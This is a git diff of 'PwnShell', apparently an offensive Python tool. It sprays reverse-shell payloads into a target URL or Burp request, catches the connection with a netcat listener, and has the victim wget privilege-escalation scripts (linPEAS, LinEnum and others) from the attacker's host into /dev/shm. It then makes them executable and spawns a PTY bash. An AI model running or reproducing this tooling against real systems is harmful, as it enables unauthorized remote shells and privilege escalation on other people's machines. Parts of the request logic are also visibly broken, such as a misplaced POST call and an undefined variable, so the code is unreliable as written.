@@ -17,13 +17,11 @@ from payloads import PayLoads
 import time
 import socket
 import burpee
-from colors import Colors, ColorsSet
 
 
 class PwnShell:
     def __init__(self, args):
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
         self.ip = ip_address
         self.ip = args.host
         self.port = args.port
@@ -34,6 +32,8 @@ class PwnShell:
         self.type = args.type
         self.file = args.file
         self.nodejs = args.nodejs
+        self.url=None
+        self.iteration=None
 
         ########################################################################
         ###################### Specifying OS ###################################
@@ -47,14 +47,11 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port, '[*]TARGET URL': self.domain,
-                '[*]Method': self.method.upper(), '[*]Post Data': self.data, '[*]Payload Type': self.type.upper(),
-                '[*]Request file': self.file, '[*]Use nodejs payloads': self.nodejs}
+        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
         for key, value in info.items():
             if value:
-                print(colors.get_colored_text(f'{key} : {value}', ColorsSet.WHITE))
+                print(f'{key} : {value}')
         print("\n")
-
     ####################################################################################
     ###################################  LINUX #########################################
 
@@ -90,19 +87,23 @@ class PwnShell:
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         nc = nclib.Netcat(listen=('', self.port))
-        print(f"\n[*]Got Connection From -> [{self.ip}:{self.port}]")
-        print("[*]Payload :", self.current_payload)
-        print('[*]Uploading Shell Script To [/dev/shm] On Target Machine...')
-        os.system(
-            'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
-        time.sleep(3)
-        print('[*]Auto Stablizing & Uploading PrivESC Scripts -> Works ONLY For [Bash/Sh] Shells For Now <-')
+        print("\n\n[!]STAGE #2 --> [INFO] <--")
+        print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
+        print("[+]Vulnerable URL:",self.url)
+        print(f"[+]Number Of Payloads Tested : [{self.iteration}]") 
+        print("\n[!]STAGE #3 --> [STABILIZING] <--")
+        print('[*]Cloning PrivESC Scripts From Their Repositories... ')
+        time.sleep(1)
+        print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
+        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh , curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+        print('[*]Activating a TTY Shell Using --> [Python3]')
         time.sleep(5)
         nc.send_line(b"export TERM=xterm-256color")
-        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh'''
+        send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts'''
         nc.send_line(send.encode("utf-8"))
-        send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
+        send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; clear ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null'''
         nc.send_line(send.encode("utf-8"))
+        nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
         nc.interact()
         nc.close()
 
@@ -143,46 +144,39 @@ class PwnShell:
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
-        self.list = []
-        self.iteration = 0
-        payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
-        for payload in payloads:
-            self.list.append(payload)
-        if not self.file:
-            for payload in payloads:
-                self.iteration += 1
-                print(f'[*]Trying payload -> [{self.iteration}/{len(self.list)}]', end='\r')
-                time.sleep(2)  # Change this ASAP !!!
-                self.send_request(payload)
+    	print("[!]STAGE #1 --> [BRUTEFORCING] <--")
+    	listt=[]
+    	self.iteration=0
+    	payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
+    	for payload in payloads:
+    		listt.append(payload)
+    	if not self.file:
+    		for payload in payloads:
+    			encoded_payload = self.get_url_encoded_payload(payload)
+    			self.iteration += 1
+    			print(f'[*]Trying payload [{self.iteration}/{len(listt)}] : {encoded_payload}',end='\r',flush=True)
+    			time.sleep(2)  # Change this ASAP !!!
+    			self.send_request(encoded_payload)
 
-    #########################################################################################
+    ###############################################################################################
     ###################################  Send The Request #########################################
-    def send_request(self, payload):
+    def send_request(self,encoded_payload):
         if self.domain:
-            encoded_payload = self.get_url_encoded_payload(payload)
-            url = self.domain.replace('PWNME', encoded_payload)
-            # print(url)
-            proxies = {'http': 'http://127.0.0.1:8080'}
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
-                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                       "Upgrade-Insecure-Requests": "1",
-                       'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
-
-            self.current_payload = encoded_payload  # For output when getting a shell
-            if self.cookie:
-                cookies = self.cookie
-            else:
-                cookies = None
-            if self.method == 'post' or self.method == 'POST':
-                if self.data:
-                    data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
-                    print("\n[+]Stauts Code ->", "[" + f'{r.status_code}' + "]")
-                else:
-                    data_parsed = None
-                    r = requests.post(url, headers=headers, data=data_parsed, cookies=cookies, verify=False)
-            else:
-                r = requests.get(url, cookies=cookies, verify=False)
+        	self.url = self.domain.replace('PWNME',encoded_payload)
+        	proxies = {'http': 'http://127.0.0.1:8080'}
+        	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
+        	if self.cookie:
+        		cookies = self.cookie
+        	else:
+        		cookies =None
+        	if self.method == 'post' or self.method == 'POST':
+        		if self.data:
+        			data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
+        		else:
+        			data_parsed = None
+        			r = requests.post(self.url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
+        	else:
+        		r = requests.get(self.url, cookies=cookies, verify=False)                    
 
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
@@ -196,15 +190,15 @@ class PwnShell:
                 if request[r] == "PWNME":
                     request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
                 if r == "Host":
-                    url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
+                    self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
 
             if post_data:
-                url = url.replace("PWNME", encoded_payload)
+                self.url = self.url.replace("PWNME", encoded_payload)
                 post_data = post_data.replace("PWNME", encoded_payload)
                 req = requests.post(url, headers=request, data=post_data, verify=False)
             else:
-                url = url.replace("PWNME", encoded_payload)
-                req = requests.get(url, headers=request,verify=False)
+                self.url = self.url.replace("PWNME", encoded_payload)
+                req = requests.get(self.url, headers=request,verify=False)
                 time.sleep(2)
 
     #########################################################################################
@@ -235,9 +229,6 @@ if __name__ == '__main__':
                 Authors: AbuQasem & AlBalouli
             ##############################################################  
             '''
-        # Setting The Colors class with the default color
-        colors = Colors(default_color=ColorsSet.GREEN)
-
         print(banner)
         parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
         try:
